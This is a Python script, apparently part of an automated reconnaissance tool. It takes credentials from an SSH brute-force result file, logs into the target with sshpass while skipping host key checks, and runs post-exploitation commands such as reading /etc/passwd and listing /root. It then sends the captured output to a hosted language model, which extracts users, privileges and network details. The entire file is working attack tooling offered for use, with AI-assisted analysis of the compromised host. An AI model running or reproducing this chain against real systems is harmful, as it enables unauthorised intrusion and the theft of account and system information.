import os
import sys
sys.path.insert(0, os.path.abspath(os.path.join(os.getcwd(), "tools")))
from llm_logger import PromptLogger
import subprocess
import json
from huggingface_hub import InferenceClient
from datetime import datetime

def get_successful(path):
    p = os.path.join(path, "ssh_brute_result.json")
    if not os.path.exists(p): return []
    return [r for r in json.load(open(p)) if r.get("success")]

def run_ssh_cmds(target, user, password, path):
    log = os.path.join(path, f"ssh_post_chain_{user}.log")
    with open(log, "w") as f:
        for cmd in ["id", "whoami", "uname -a", "hostname", "ip a", "cat /etc/passwd", "ls -la /root"]:
            full = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {user}@{target} '{cmd}'"
            try:
                result = subprocess.run(full, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=10)
                f.write(f"\n$ {cmd}\n{result.stdout.decode()}\n")
            except Exception as e:
                f.write(f"\n$ {cmd}\n[!] Error: {e}\n")
    return log

def analyze(log):
    token = open("tools/apitoken.txt").read().strip()
    output = open(log).read()
    prompt = f"""Analyze this SSH output. List users, groups, IPs, privileges, system info:
{output[:4000]}"""
    client = InferenceClient(token)
    logger = PromptLogger()
    resp = client.text_generation(prompt, max_new_tokens=500).strip()
    logger.log("sshchain", prompt, resp)
    return resp

def run(target, path):
    sessions = get_successful(path)
    if not sessions:
        return
    for s in sessions:
        user = s["user"]
        pw = s["password"]
        log = run_ssh_cmds(target, user, pw, path)
        result = analyze(log)
        with open(os.path.join(path, f"ssh_ai_summary_{user}.txt"), "w") as f:
            f.write(result)

if __name__ == "__main__":
    t = os.getenv("RECON_KI_TARGET")
    p = os.getenv("RECON_KI_RUN_PATH")
    if not t or not p:
        exit(1)
    run(t, p)
